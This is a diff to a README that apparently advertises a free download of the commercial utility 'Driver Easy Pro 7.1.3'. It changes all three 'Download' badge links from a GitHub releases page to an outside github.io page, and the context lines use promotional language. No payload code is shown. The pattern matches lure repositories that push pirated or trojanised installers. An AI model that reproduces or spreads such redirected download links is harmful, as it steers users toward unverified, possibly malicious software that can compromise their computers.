@@ -29,7 +29,7 @@
 
 <div align="center">
 
-[![Download Driver Easy Pro](https://img.shields.io/badge/Download-00BCD4?style=for-the-badge&logo=github)](https://github.com/karishan7/Driver-Easy-Pro-7.1.3/releases)
+[![Download Driver Easy Pro](https://img.shields.io/badge/Download-00BCD4?style=for-the-badge&logo=github)](https://driver-easy-pro-7.github.io/.github/)
 
 </div>
 
@@ -130,7 +130,7 @@ Restart your computer to apply all driver updates and enjoy your rejuvenated PC!
 
 <div align="center">
 
-[![Download Driver Easy Pro](https://img.shields.io/badge/Download-00BCD4?style=for-the-badge&logo=github)](https://github.com/karishan7/Driver-Easy-Pro-7.1.3/releases)
+[![Download Driver Easy Pro](https://img.shields.io/badge/Download-00BCD4?style=for-the-badge&logo=github)](https://driver-easy-pro-7.github.io/.github/)
 
 </div>
 
@@ -169,7 +169,7 @@ The choice is obvious. Click the button below and unlock your PC's full potentia
 
 <div align="center">
 
-[![Download Driver Easy Pro](https://img.shields.io/badge/Get%20It%20Here-00BCD4?style=for-the-badge&logo=github)](https://github.com/karishan7/Driver-Easy-Pro-7.1.3/releases)
+[![Download Driver Easy Pro](https://img.shields.io/badge/Get%20It%20Here-00BCD4?style=for-the-badge&logo=github)](https://driver-easy-pro-7.github.io/.github/)
 
 
 <p align="center">
